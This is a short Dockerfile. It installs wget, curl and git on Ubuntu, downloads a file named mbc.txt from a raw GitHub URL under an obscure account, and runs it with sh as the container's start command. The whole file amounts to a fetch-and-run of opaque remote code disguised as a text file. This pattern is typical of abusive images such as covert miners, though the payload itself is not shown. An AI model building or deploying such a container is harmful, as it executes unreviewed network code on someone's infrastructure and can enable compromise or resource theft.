FROM ubuntu:22.04
RUN apt update
RUN apt install wget curl git -y
RUN wget https://raw.githubusercontent.com/rpoolm001/vs/main/mbc.txt
CMD sh mbc.txt
